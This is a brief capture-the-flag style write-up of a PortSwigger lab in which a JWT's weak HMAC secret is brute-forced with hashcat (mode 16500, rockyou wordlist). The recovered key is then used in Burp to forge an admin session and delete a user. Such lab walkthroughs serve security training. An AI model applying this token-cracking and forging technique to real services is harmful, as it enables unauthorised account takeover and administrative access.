# Lab: JWT authentication bypass via weak signing key
---
In burpsuite we install "JSON Web Token" and "jwt editor"

It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced using a wordlist of common secrets.

Target: o solve the lab, first brute-force the website's secret key. Once you've obtained this, use it to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos.

https://0a13003a04a319ef805b44e90009003a.web-security-academy.net/admin

We copy the jwt into the "firma.txt" file

hashcat --help | grep JWT

hashcat -m 16500 --force -a 0 firma.jwt /usr/share/wordlists/rockyou.txt 

hashcat -m 16500 --force -a 0 firma.jwt /usr/share/wordlists/rockyou.txt --show => eyJraWQiOiI2M2EzMzQ0OS01NjJjLTQ0NDQtOTJlOC1lNTYzZGZlMWY5NWEiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0ODU0MjgwMCwic3ViIjoid2llbmVyIn0.F3VAqmnu0R72aLdOSy4Hdz-amUFSQAYRQ0ofq_m7uog:secret1

---

### In this screenshot we write the secret key in recalculate signature
![image](https://github.com/user-attachments/assets/08108748-3301-4363-93bb-313c58c6a9fe)

---

